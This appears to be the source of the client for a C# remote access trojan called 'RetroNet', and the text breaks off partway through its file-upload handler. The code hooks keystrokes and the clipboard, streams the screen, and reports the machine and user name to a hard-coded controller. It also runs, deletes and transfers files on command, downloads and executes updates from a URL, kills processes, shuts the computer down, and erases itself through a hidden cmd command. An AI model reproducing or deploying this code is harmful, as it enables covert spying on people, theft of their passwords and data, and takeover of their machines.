using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RetroNet_Client
{
    public enum Command : byte
    {
        EncryptionKey = 0x0,
        ConnectInfo = 0x1,
        CloseSocket = 0x2,
        CpuRam = 0x3,
        UninstallClient = 0x4,
        RestartClient = 0x5,
        UpdateClientFile = 0x6,
        UpdateClientUrl = 0x7,
        ShutDownComputer = 0x8,
        RestartComputer = 0x9,
        LogOffComputer = 0xA,
        StartRemoteDesktop = 0xB,
        StopRemoteDesktop = 0xC,
        RemoteDesktopImage = 0xD,
        RemoteDesktopQuality = 0xE,
        RemoteDesktopKeyDown = 0xF,
        RemoteDesktopKeyUp = 0x10,
        RemoteDesktopLDown = 0x11,
        RemoteDesktopLUp = 0x12,
        RemoteDesktopRDown = 0x13,
        RemoteDesktopRUp = 0x14,
        GetWebcam = 0x15,
        StartWebcam = 0x16,
        StopWebcam = 0x17,
        WebcamQuality = 0x18,
        WebcamImage = 0x19,
        GetRootDrives = 0x1A,
        Navigate = 0x1B,
        ExecuteFile = 0x1C,
        DeleteFile = 0x1D,
        DeleteFolder = 0x1E,
        UploadFileBegin = 0x1F,
        UploadFilePart = 0x20,
        UploadFileEnd = 0x21,
        DownloadFileBegin = 0x22,
        DownloadFilePart = 0x23,
        DownloadFileEnd = 0x24,
        GetProcessList = 0x25,
        SuspendProcess = 0x26,
        ResumeProcess = 0x27,
        KillProcess = 0x28,
        KeystrokeStart = 0x29,
        KeystrokeStop = 0x2A,
        KeystrokeInfo = 0x2B,
        ClipboardStart = 0x2C,
        ClipboardStop = 0x2D,
        ClipboardInfo = 0x2E,
        GetApplications = 0x2F,
        UninstallApplication = 0x30,

    }

    public class Packet
    {
        private Command _cmd;
        private List<Byte[]> _data;

        public Packet(Command cmd)
        {
            _cmd = cmd;
            _data = new List<byte[]>();
        }

        public Packet(byte[] data)
        {
            _cmd = (Command)data[0];
            _data = new List<byte[]>();

            int pos = 1;

            while (pos < data.Length)
            {
                int length = BitConverter.ToInt32(data, pos);
                byte[] barray = new byte[length];

                Buffer.BlockCopy(data, pos + 4, barray, 0, length);
                _data.Add(barray);

                pos += 4 + length;
            }
        }

        public void addData(byte[] data)
        {
            _data.Add(data);
        }

        public void addData(string data)
        {
            _data.Add(Encoding.Unicode.GetBytes(data));
        }

        public void addData(Image data)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                data.Save(ms, ImageFormat.Jpeg);
                _data.Add(ms.ToArray());
            }
        }

        public byte[] toArray()
        {
            MemoryStream ms = new MemoryStream();

            ms.WriteByte((byte)_cmd);

            foreach (byte[] barray in _data)
            {
                ms.Write(BitConverter.GetBytes(barray.Length), 0, 4);
                ms.Write(barray, 0, barray.Length);
            }

            return ms.ToArray();
        }

        public Command Command
        {
            get
            {
                return _cmd;
            }
        }

        public byte[][] Data
        {
            get
            {
                return _data.ToArray();
            }
        }
    }

    public class Connection
    {
        private TcpClient _client;
        private BinaryFormatter _formatter;

        private bool _secured;
        private object _encLock;
        private object _decLock;
        private ICryptoTransform _encryptor;
        private ICryptoTransform _decryptor;

        public delegate void OnDisconnect(Connection client);
        public event OnDisconnect OnDisconnectEvent;

        public delegate void OnDataReceived(Connection client, byte[] data);
        public event OnDataReceived OnDataReceivedEvent;

        public delegate void OnDataSent(Connection client, byte[] data);
        public event OnDataSent OnDataSentEvent;

        public Connection(TcpClient client)
        {
            _client = client;
            _formatter = new BinaryFormatter();

            _secured = false;
            _encLock = new object();
            _decLock = new object();
            _encryptor = null;
            _decryptor = null;

            IPAddress = ((IPEndPoint)_client.Client.RemoteEndPoint).Address;
            Port = ((IPEndPoint)_client.Client.RemoteEndPoint).Port;
        }

        public void beginRead()
        {
            _client.GetStream().BeginRead(new byte[] { }, 0, 0, read, null);
        }

        public void read(IAsyncResult ar)
        {
            try
            {
                if (_client.GetStream().DataAvailable && _client.GetStream().CanRead && OnDataReceivedEvent != null)
                {
                    byte[] data = (byte[])_formatter.Deserialize(_client.GetStream());

                    lock (_decLock)
                    {
                        if (_secured)
                            data = _decryptor.TransformFinalBlock(data, 0, data.Length);
                    }

                    if (OnDataReceivedEvent != null)
                        OnDataReceivedEvent(this, data);
                }

                _client.GetStream().Flush();
                _client.GetStream().BeginRead(new byte[] { }, 0, 0, read, null);
            }
            catch
            {
                if (OnDisconnectEvent != null)
                    OnDisconnectEvent(this);
            }
        }

        public void send(byte[] data)
        {
            try
            {
                lock (_encLock)
                {
                    if (_secured)
                        data = _encryptor.TransformFinalBlock(data, 0, data.Length);
                }

                NetworkStream stream = _client.GetStream();

                lock (stream)
                    _formatter.Serialize(stream, data);

                if (OnDataSentEvent != null)
                    OnDataSentEvent(this, data);
            }
            catch { }
        }

        public void createEncryption(byte[] data)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048);
            rsa.ImportCspBlob(data);

            RijndaelManaged r = new RijndaelManaged();

            lock (_encLock)
                _encryptor = r.CreateEncryptor();

            lock (_decLock)
                _decryptor = r.CreateDecryptor();

            Packet toSend = new Packet(Command.EncryptionKey);

            toSend.addData(rsa.Encrypt(r.Key, true));
            toSend.addData(rsa.Encrypt(r.IV, true));

            send(toSend.toArray());

            _secured = true;
        }

        public void closeConnection()
        {
            _client.Close();
        }

        public IPAddress IPAddress { get; private set; }

        public int Port { get; private set; }
    }

    public class Pair<T1, T2>
    {
        public T1 First { get; set; }
        public T2 Second { get; set; }
    }

    public static class KeySender
    {
        [DllImport("user32.dll")]
        public static extern uint SendInput(uint nInputs, INPUT[] pInputs, int cbSize);

        [DllImport("user32.dll")]
        public static extern short VkKeyScan(char ch);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetMessageExtraInfo();

        [StructLayout(LayoutKind.Explicit)]
        public struct INPUT
        {
            [FieldOffset(4)]
            public HARDWAREINPUT hi;
            [FieldOffset(4)]
            public KEYBDINPUT ki;
            [FieldOffset(4)]
            public MOUSEINPUT mi;
            [FieldOffset(0)]
            public int type;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MOUSEINPUT
        {
            public int dx;
            public int dy;
            public int mouseData;
            public int dwFlags;
            public int time;
            public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KEYBDINPUT
        {
            public short wVk;
            public short wScan;
            public int dwFlags;
            public int time;
            public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct HARDWAREINPUT
        {
            public int uMsg;
            public short wParamL;
            public short wParamH;
        }

        [Flags]
        public enum InputType
        {
            INPUT_MOUSE = 0,
            INPUT_KEYBOARD = 1,
            INPUT_HARDWARE = 2
        }

        [Flags]
        public enum MOUSEEVENTF
        {
            MOVE = 0x0001,
            LEFTDOWN = 0x0002,
            LEFTUP = 0x0004,
            RIGHTDOWN = 0x0008,
            RIGHTUP = 0x0010,
            MIDDLEDOWN = 0x0020,
            MIDDLEUP = 0x0040,
            XDOWN = 0x0080,
            XUP = 0x0100,
            WHEEL = 0x0800,
            MOVE_NOCOALESCE = 0x2000,
            VIRTUALDESK = 0x4000,
            ABSOLUTE = 0x8000
        }

        [Flags]
        public enum KEYEVENTF
        {
            KEYDOWN = 0,
            EXTENDEDKEY = 0x0001,
            KEYUP = 0x0002,
            UNICODE = 0x0004,
            SCANCODE = 0x0008,
        }

        public static void LeftMouseDown()
        {
            INPUT input = new INPUT();
            input.mi.dx = 0;
            input.mi.dy = 0;
            input.mi.mouseData = 0;
            input.mi.dwFlags = 2;

            SendInput(1, new INPUT[] { input }, Marshal.SizeOf(input));
        }

        public static void LeftMouseUp()
        {
            INPUT input = new INPUT();
            input.mi.dx = 0;
            input.mi.dy = 0;
            input.mi.mouseData = 0;
            input.mi.dwFlags = 4;

            SendInput(1, new INPUT[] { input }, Marshal.SizeOf(input));
        }

        public static void RightMouseDown()
        {
            INPUT input = new INPUT();
            input.mi.dx = 0;
            input.mi.dy = 0;
            input.mi.mouseData = 0;
            input.mi.dwFlags = 8;

            SendInput(1, new INPUT[] { input }, Marshal.SizeOf(input));
        }

        public static void RightMouseUp()
        {
            INPUT input = new INPUT();
            input.mi.dx = 0;
            input.mi.dy = 0;
            input.mi.mouseData = 0;
            input.mi.dwFlags = 10;

            SendInput(1, new INPUT[] { input }, Marshal.SizeOf(input));
        }

        public static void Click()
        {
            INPUT firstInput = new INPUT();
            firstInput.mi.dx = 0;
            firstInput.mi.dy = 0;
            firstInput.mi.mouseData = 0;
            firstInput.mi.dwFlags = 2;

            INPUT secondInput = firstInput;
            secondInput.mi.dwFlags = 4;

            INPUT[] pInputs = new INPUT[] { firstInput, secondInput };

            SendInput(2, pInputs, Marshal.SizeOf(firstInput));
        }

        public static void KeyDown(Keys key)
        {
            INPUT input = new INPUT();
            input.type = (int)InputType.INPUT_KEYBOARD;
            input.ki.wVk = (short)key;
            input.ki.dwFlags = (int)KEYEVENTF.KEYDOWN;
            input.ki.dwExtraInfo = GetMessageExtraInfo();

            SendInput(1, new INPUT[] { input }, Marshal.SizeOf(input));
        }

        public static void KeyUp(Keys key)
        {
            INPUT input = new INPUT();
            input.type = (int)InputType.INPUT_KEYBOARD;
            input.ki.wVk = (short)key;
            input.ki.dwFlags = (int)KEYEVENTF.KEYUP;
            input.ki.dwExtraInfo = GetMessageExtraInfo();

            SendInput(1, new INPUT[] { input }, Marshal.SizeOf(input));
        }
    }

    public abstract class Streamer
    {
        protected Connection _client;
        protected MD5 _md5;
        protected bool _streaming;
        private int _quality;

        public Streamer(Connection client)
        {
            _client = client;
            _md5 = MD5.Create();
            _streaming = false;
            _quality = 100;
        }

        abstract public void start();

        abstract public void stop();

        abstract protected Image getScreen();

        public void setQuality(int amount)
        {
            if (amount > 100)
                _quality = 100;

            if (amount < 0)
                _quality = 0;

            _quality = amount;
        }

        protected string computeHash(byte[] data)
        {
            if (data == null)
                return string.Empty;
   
            string ret = string.Empty;
            byte[] hashBytes = _md5.ComputeHash(data);

            for (int i = 0; i < hashBytes.Length; i++)
                ret += hashBytes[i].ToString("x2");

            return ret;
        }

        protected byte[] getImageBytes(Image img)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                EncoderParameters param = new EncoderParameters(1);
                EncoderParameter myEncoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, _quality);

                param.Param[0] = myEncoderParameter;
                img.Save(ms, getEncoder(ImageFormat.Jpeg), param);

                return ms.ToArray();
            }
        }

        private ImageCodecInfo getEncoder(ImageFormat format)
        {
            foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageDecoders())
                if (codec.FormatID == format.Guid)
                    return codec;

            return null;
        }
    }

    public class RemoteDesktop : Streamer
    {
        public RemoteDesktop(Connection client)
            : base(client)
        { }

        public override void start()
        {
            Thread t = new Thread(() =>
                {
                    _streaming = true;
                    byte[] previous = null;

                    while (_streaming)
                    {
                        byte[] current = getImageBytes(getScreen());

                        if (computeHash(current) != computeHash(previous))
                        {
                            Packet toSend = new Packet(Command.RemoteDesktopImage);

                            toSend.addData(current);
                            _client.send(toSend.toArray());

                            previous = current;
                        }
                    }
                });

            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        public override void stop()
        {
            _streaming = false;
        }

        protected override Image getScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics g = Graphics.FromImage(screen);

            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);

            return screen;
        }
    }

    public class WebcamViewer : Streamer
    {
        public WebcamViewer(Connection client)
            : base(client)
        { }

        public override void start()
        {
            Thread t = new Thread(() =>
            {
                _streaming = true;
                byte[] previous = null;

                while (_streaming)
                {
                    byte[] current = getImageBytes(getScreen());

                    if (computeHash(current) != computeHash(previous))
                    {
                        Packet toSend = new Packet(Command.WebcamImage);

                        toSend.addData(current);
                        _client.send(toSend.toArray());

                        previous = current;
                    }
                }
            });

            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        public override void stop()
        {
            _streaming = false;
        }

        protected override Image getScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics g = Graphics.FromImage(screen);

            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);

            return screen;
        }
    }

    public class Keyboard
    {
        [StructLayout(LayoutKind.Sequential)]
        public class KeyStruct
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        private int _key;
        private HookProc _hook;

        public delegate void OnKey(string key);
        public event OnKey KeyUp;
        public event OnKey KeyDown;

        public delegate int HookProc(int code, int wParam, KeyStruct lParam);

        [DllImport("user32.dll")]
        public static extern int SetWindowsHookEx(int hookType, HookProc lpfn, int hMod, int dwThreadId);

        [DllImport("user32.dll")]
        public static extern int CallNextHookEx(int hhk, int nCode, int wParam, KeyStruct lParam);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(int hhk);

        public Keyboard()
        {
            _hook = proc;
        }

        public void hook()
        {
            _key = SetWindowsHookEx(13, _hook, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
        }

        public void unhook()
        {
            UnhookWindowsHookEx(_key);
        }

        private int proc(int code, int wParam, KeyStruct lParam)
        {
            if (code == 0)
            {
                switch (wParam)
                {
                    case 0x100:
                    case 0x104:
                        if (KeyDown != null)
                            KeyDown(convert((Keys)lParam.vkCode));
                        break;
                    case 0x101:
                    case 0x105:
                        if (KeyUp != null)
                            KeyUp(convert((Keys)lParam.vkCode));
                        break;
                }
            }

            return CallNextHookEx(_key, code, wParam, lParam);
        }

        private string convert(Keys k)
        {
            int keyVal = (int)k;

            if (keyVal == 32)
            {
                return " ";
            }
            else if (keyVal >= 48 && keyVal <= 57)
            {
                if ((Control.ModifierKeys & Keys.Shift) != 0)
                {
                    switch (k.ToString())
                    {
                        case "D1": return "!";
                        case "D2": return "@";
                        case "D3": return "#";
                        case "D4": return "$";
                        case "D5": return "%";
                        case "D6": return "^";
                        case "D7": return "&";
                        case "D8": return "*";
                        case "D9": return "(";
                        case "D0": return ")";
                    }
                }

                return k.ToString().Replace("D", string.Empty);
            }
            else if (keyVal >= 65 && keyVal <= 90)
            {
                if (Control.IsKeyLocked(Keys.CapsLock) || (Control.ModifierKeys & Keys.Shift) != 0)
                    return k.ToString();

                return k.ToString().ToLower();
            }
            else if (keyVal >= 96 && keyVal <= 105)
            {
                return k.ToString().Replace("NumPad", string.Empty);
            }
            else if (keyVal >= 106 && keyVal <= 111)
            {
                switch (k.ToString())
                {
                    case "Divide": return "/";
                    case "Multiply": return "*";
                    case "Subtract": return "-";
                    case "Add": return "+";
                    case "Decimal": return ".";
                }
            }
            else if (keyVal >= 186 && keyVal <= 222)
            {
                if ((Control.ModifierKeys & Keys.Shift) != 0)
                {
                    switch (k.ToString())
                    {
                        case "OemMinus": return "_";
                        case "Oemplus": return "+";
                        case "OemOpenBrackets": return "{";
                        case "Oem6": return "}";
                        case "Oem5": return "|";
                        case "Oem1": return ":";
                        case "Oem7": return "\"";
                        case "Oemcomma": return "<";
                        case "OemPeriod": return ">";
                        case "OemQuestion": return "?";
                        case "Oemtilde": return "~";
                    }
                }
                else
                {
                    switch (k.ToString())
                    {
                        case "OemMinus": return "-";
                        case "Oemplus": return "=";
                        case "OemOpenBrackets": return "[";
                        case "Oem6": return "]";
                        case "Oem5": return @"\";
                        case "Oem1": return ";";
                        case "Oem7": return "'";
                        case "Oemcomma": return ",";
                        case "OemPeriod": return ".";
                        case "OemQuestion": return "/";
                        case "Oemtilde": return "`";
                    }
                }
            }
            else if (keyVal >= 160 && keyVal <= 161)
            { }
            else if (k == Keys.Return)
            {
                return "<br>";
            }

            return "<span style=\"background-color:yellow;\">[" + k.ToString() + "]</span>";
        }
    }

    public class Clipboard : NativeWindow
    {
        IntPtr _hwnd;

        public delegate void Changed();
        public event Changed ChangedEvent;

        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        public Clipboard()
        {
            CreateHandle(new CreateParams());
        }

        ~Clipboard()
        {
            uninstall();
        }

        public void install()
        {
            _hwnd = SetClipboardViewer(Handle);
        }

        public void uninstall()
        {
            ChangeClipboardChain(Handle, _hwnd);
        }

        protected override void WndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case 776:
                    if (ChangedEvent != null)
                        ChangedEvent();

                    SendMessage(_hwnd, (uint)m.Msg, m.WParam, m.LParam);

                    break;
                case 781:
                    if (m.WParam == _hwnd)
                        _hwnd = m.LParam;
                    else
                        SendMessage(_hwnd, (uint)m.Msg, m.WParam, m.LParam);

                    break;
            }

            base.WndProc(ref m);
        }
    }

    static class Program
    {
        private static bool _connected = false;
        private static Connection _client;
        private static string _host = "127.0.0.1";
        private static int _port = 2358;
        private static string _identity = "Identity";
        private static PerformanceCounter _cpu = new PerformanceCounter("Processor", "% Processor Time") { InstanceName = "_Total" };
        private static PerformanceCounter _ram = new PerformanceCounter("Memory", "% Committed Bytes In Use");
        private static string _version = "1.0";
        private static AutoResetEvent _delayer = new AutoResetEvent(false);
        private static Dictionary<int, FileStream> _uploads = new Dictionary<int, FileStream>();
        private static Dictionary<int, Pair<byte[], int>> _downloads = new Dictionary<int, Pair<byte[], int>>();
        private static RemoteDesktop _rDesktop = null;
        private static WebcamViewer _wViewer = null;
        private static Keyboard _kboard = new Keyboard();
        private static Clipboard _cboard = new Clipboard();
        private static bool _sendKey = false;
        private static bool _sendClip = false;
        private static Dictionary<string, Tuple<bool, string>> _applications = new Dictionary<string, Tuple<bool, string>>();

        [DllImport("user32.dll")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr OpenThread(int dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

        [DllImport("kernel32.dll")]
        static extern uint SuspendThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern int ResumeThread(IntPtr hThread);

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            _delayer.WaitOne(5000);

            String[] args = Environment.GetCommandLineArgs();

            if (args.Length > 1)
            {
                File.Copy(Application.ExecutablePath, args[1], true);
                Process.Start(args[1]);
                Environment.Exit(0);
            }

            _kboard.hook();
            _kboard.KeyDown += _kboard_KeyDown;

            _cboard.install();
            _cboard.ChangedEvent += _cboard_ChangedEvent;

            Thread t = new Thread(connect);
            t.SetApartmentState(ApartmentState.STA);
            t.Start();

            Application.Run();
        }

        private static void connect()
        {
            while (!_connected)
            {
                try
                {
                    _client = new Connection(new TcpClient(_host, _port));

                    _client.OnDataReceivedEvent += _client_OnDataReceivedEvent;
                    _client.OnDisconnectEvent += _client_OnDisconnectEvent;

                    _client.beginRead();

                    _connected = true;
                }
                catch
                {
                    _delayer.WaitOne(4000);
                }
            }
        }

        public static void _client_OnDisconnectEvent(Connection client)
        {
            _connected = false;
            _delayer.WaitOne(4000);
            connect();
        }

        public static void _client_OnDataReceivedEvent(Connection client, byte[] data)
        {
            try
            {
                Packet p = new Packet(data);

                switch (p.Command)
                {
                    case Command.EncryptionKey:
                        handleEncryption(client, p);
                        break;
                    case Command.ConnectInfo:
                        handleConnectionInfo(client);
                        break;
                    case Command.CloseSocket:
                        client.closeConnection();
                        break;
                    case Command.UninstallClient:
                        uninstall();
                        break;
                    case Command.RestartClient:
                        Application.Restart();
                        break;
                    case Command.UpdateClientFile:
                        updateFromFile(p);
                        break;
                    case Command.UpdateClientUrl:
                        updateFromUrl(p);
                        break;
                    case Command.ShutDownComputer:
                        Process.Start("shutdown", "/s /t 0");
                        break;
                    case Command.RestartComputer:
                        Process.Start("shutdown", "/r /t 0");
                        break;
                    case Command.LogOffComputer:
                        ExitWindowsEx(0, 0);
                        break;
                    case Command.StartRemoteDesktop:
                        _rDesktop = new RemoteDesktop(_client);
                        _rDesktop.start();
                        break;
                    case Command.StopRemoteDesktop:
                        _rDesktop.stop();
                        break;
                    case Command.RemoteDesktopQuality:
                        _rDesktop.setQuality(Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0])));
                        break;
                    case Command.RemoteDesktopKeyDown:
                        handleKeyDown(p);
                        break;
                    case Command.RemoteDesktopKeyUp:
                        handleKeyUp(p);
                        break;
                    case Command.RemoteDesktopLDown:
                        handleLDown(p);
                        break;
                    case Command.RemoteDesktopLUp:
                        handleLUp(p);
                        break;
                    case Command.RemoteDesktopRDown:
                        handleRDown(p);
                        break;
                    case Command.RemoteDesktopRUp:
                        handleRUp(p);
                        break;
                    case Command.StartWebcam:
                        _wViewer = new WebcamViewer(_client);
                        _wViewer.start();
                        break;
                    case Command.StopWebcam:
                        _wViewer.stop();
                        break;
                    case Command.WebcamQuality:
                        _wViewer.setQuality(Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0])));
                        break;
                    case Command.GetRootDrives:
                        handleRootDrives(client);
                        break;
                    case Command.Navigate:
                        handleNavigate(client, p);
                        break;
                    case Command.ExecuteFile:
                        handleExecuteFile(p);
                        break;
                    case Command.DeleteFile:
                        handleDeleteFile(p);
                        break;
                    case Command.DeleteFolder:
                        handleDeleteFolder(p);
                        break;
                    case Command.UploadFileBegin:
                        handleUploadFileBegin(client, p);
                        break;
                    case Command.UploadFilePart:
                        handleUploadFilePart(client, p);
                        break;
                    case Command.UploadFileEnd:
                        handleUploadFileEnd(client, p);
                        break;
                    case Command.DownloadFileBegin:
                        handleDownloadFileBegin(client, p);
                        break;
                    case Command.DownloadFilePart:
                        handleDownloadFilePart(client, p);
                        break;
                    case Command.GetProcessList:
                        handleGetProcessList(client);
                        break;
                    case Command.SuspendProcess:
                        handleSuspendProcess(p);
                        break;
                    case Command.ResumeProcess:
                        handleResumeProcess(p);
                        break;
                    case Command.KillProcess:
                        handleKillProcess(p);
                        break;
                    case Command.KeystrokeStart:
                        handleKeystrokeStart();
                        break;
                    case Command.KeystrokeStop:
                        handleKeystrokeStop();
                        break;
                    case Command.ClipboardStart:
                        handleClipboardStart();
                        break;
                    case Command.ClipboardStop:
                        handleClipboardStop();
                        break;
                    case Command.GetApplications:
                        handleGetApplications(client);
                        break;
                    case Command.UninstallApplication:
                        handleUninstallApplication(client, p);
                        break;
                }
            }
            catch { }
        }

        private static void handleEncryption(Connection client, Packet p)
        {
            client.createEncryption(p.Data[0]);
        }

        private static void handleConnectionInfo(Connection client)
        {
            _cpu.NextValue();
            _delayer.WaitOne(1000);

            Packet toSend = new Packet(Command.ConnectInfo);

            toSend.addData(RegionInfo.CurrentRegion.TwoLetterISORegionName);
            toSend.addData(RegionInfo.CurrentRegion.EnglishName);
            toSend.addData(_identity);
            toSend.addData(getOperatingSystem());
            toSend.addData(Environment.MachineName);
            toSend.addData(Environment.UserName);
            toSend.addData(Math.Round(_cpu.NextValue(), 2).ToString());
            toSend.addData(Math.Round(_ram.NextValue(), 2).ToString());
            toSend.addData(_version);

            client.send(toSend.toArray());

            Thread t = new Thread(() =>
                {
                    while (_connected)
                    {
                        _cpu.NextValue();
                        _delayer.WaitOne(10000);

                        Packet twoSend = new Packet(Command.CpuRam);

                        twoSend.addData(Math.Round(_cpu.NextValue(), 2).ToString());
                        twoSend.addData(Math.Round(_ram.NextValue(), 2).ToString());

                        client.send(twoSend.toArray());
                    }
                });

            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = true;
            t.Start();
        }

        private static string getOperatingSystem()
        {
            Dictionary<string, string> osNames = new Dictionary<string, string>()
                {
                    { "50", "Windows 2000" },
                    { "51", "Windows XP" },
                    { "52", "Windows XP" },
                    { "60", "Windows Vista" },
                    { "61", "Windows 7" },
                    { "62", "Windows 8" },
                    { "63", "Windows 8.1" },
                    { "100", "Windows 10" }
                };

            string key = Environment.OSVersion.Version.Major.ToString() + Environment.OSVersion.Version.Minor.ToString();

            return osNames.ContainsKey(key) ? osNames[key] + (Environment.Is64BitOperatingSystem ? " x64" : "x32") : "Unknown";
        }

        private static void uninstall()
        {
            //removeFromStartup();

            ProcessStartInfo info = new ProcessStartInfo();

            info.Arguments = "/C ping 8.8.8.8 -n 1 -w 3000 > Nul & Del \"" + Application.ExecutablePath + "\"";
            info.WindowStyle = ProcessWindowStyle.Hidden;
            info.CreateNoWindow = true;
            info.FileName = "cmd";

            Process.Start(info);
            Environment.Exit(0);
        }

        private static void updateFromFile(Packet p)
        {
            string path = Application.StartupPath + @"\update.exe";

            if (File.Exists(path))
                File.Delete(path);

            File.WriteAllBytes(path, p.Data[0]);
            Process.Start(path, "\"" + Application.ExecutablePath + "\"");
            Environment.Exit(0);
        }

        private static void updateFromUrl(Packet p)
        {
            string path = Application.StartupPath + @"\update.exe";

            if (File.Exists(path))
                File.Delete(path);

            using (WebClient client = new WebClient())
            {
                client.DownloadFile(Encoding.Unicode.GetString(p.Data[0]), path);
            }

            Process.Start(path, "\"" + Application.ExecutablePath + "\"");
            Environment.Exit(0);
        }

        private static void handleKeyDown(Packet p)
        {
            Keys k = (Keys)Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            KeySender.KeyDown(k);
        }

        private static void handleKeyUp(Packet p)
        {
            Keys k = (Keys)Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            KeySender.KeyUp(k);
        }

        private static void handleLDown(Packet p)
        {
            int x = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[0])) * Screen.PrimaryScreen.Bounds.Width);
            int y = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[1])) * Screen.PrimaryScreen.Bounds.Height);

            Cursor.Position = new Point(x, y);

            KeySender.LeftMouseDown();
        }

        private static void handleLUp(Packet p)
        {
            int x = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[0])) * Screen.PrimaryScreen.Bounds.Width);
            int y = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[1])) * Screen.PrimaryScreen.Bounds.Height);

            Cursor.Position = new Point(x, y);

            KeySender.LeftMouseUp();
        }

        private static void handleRDown(Packet p)
        {
            int x = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[0])) * Screen.PrimaryScreen.Bounds.Width);
            int y = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[1])) * Screen.PrimaryScreen.Bounds.Height);

            Cursor.Position = new Point(x, y);

            KeySender.RightMouseDown();
        }

        private static void handleRUp(Packet p)
        {
            int x = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[0])) * Screen.PrimaryScreen.Bounds.Width);
            int y = (int)Math.Round(Convert.ToDouble(Encoding.Unicode.GetString(p.Data[1])) * Screen.PrimaryScreen.Bounds.Height);

            Cursor.Position = new Point(x, y);

            KeySender.RightMouseUp();
        }

        private static void handleRootDrives(Connection client)
        {
            Packet toSend = new Packet(Command.GetRootDrives);

            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                if (d.DriveType == DriveType.Fixed)
                {
                    toSend.addData(d.Name);
                    toSend.addData(d.TotalSize.ToString());
                }
            }

            client.send(toSend.toArray());
        }

        private static void handleNavigate(Connection client, Packet p)
        {
            Packet toSend = new Packet(Command.Navigate);
            string path = Encoding.Unicode.GetString(p.Data[0]);

            foreach (string folder in Directory.GetDirectories(path))
                toSend.addData("-" + folder.Substring(folder.LastIndexOf(@"\") + 1));

            foreach (string file in Directory.GetFiles(path))
            {
                toSend.addData("_" + file.Substring(file.LastIndexOf(@"\") + 1));
                toSend.addData(new FileInfo(file).Length.ToString());
            }

            client.send(toSend.toArray());
        }

        private static void handleExecuteFile(Packet p)
        {
            foreach (byte[] barray in p.Data)
                Process.Start(Encoding.Unicode.GetString(barray));
        }

        private static void handleDeleteFile(Packet p)
        {
            foreach (byte[] barray in p.Data)
                File.Delete(Encoding.Unicode.GetString(barray));
        }

        private static void handleDeleteFolder(Packet p)
        {
            foreach (byte[] barray in p.Data)
                Directory.Delete(Encoding.Unicode.GetString(barray), true);
        }

        private static void handleUploadFileBegin(Connection client, Packet p)
        {
            int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            lock (_uploads)
            {
                FileStream fs = new FileStream(Encoding.Unicode.GetString(p.Data[1]), FileMode.Create);
                _uploads.Add(id, fs);
            }

            Packet toSend = new Packet(Command.UploadFilePart);
            toSend.addData(id.ToString());

            client.send(toSend.toArray());
        }

        private static void handleUploadFilePart(Connection client, Packet p)
        {
            int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            lock (_uploads)
                _uploads[id].Write(p.Data[1], 0, p.Data[1].Length);

            Packet toSend = new Packet(Command.UploadFilePart);
            toSend.addData(id.ToString());

